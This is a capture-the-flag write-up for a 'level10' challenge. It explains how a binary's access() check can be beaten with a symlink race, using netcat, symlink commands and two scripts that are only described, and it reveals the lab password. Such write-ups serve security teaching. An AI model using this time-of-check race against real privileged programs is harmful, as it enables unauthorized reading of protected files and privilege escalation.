sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"


The binary is using the access command to check if it is allowed to send the file to the specified host => exploit access 

The binary is a server sending the file in arg to specified host on port 6969

When testing the program with a dummy file and ```nc -l 6969```, we realize that it writes a header ".*( )*.\n" before sending the file
=> write a program that reads line by line to change file with a symbolic link just after the header is received

create a symlink to a dummy file with permissions :
```echo "exploit" > /tmp/myfile```
```ln -s /tmp/myfile /tmp/link```

copy the 2 scripts with ```scp -P 4242 script1.py level10@[VM_IP]:/tmp```
we ready the server with ```nc -lk 6969``` and we launch the first script ```python /tmp/script1.py``` and the second ```python /tmp/script2.py``` in parallel 
the second script switch the symlink between the dummy file and the token very fast giving alternatively the exploit output and the password : woupa2yuojeeaaed06riuj63c

```su flag10```
```getflag```
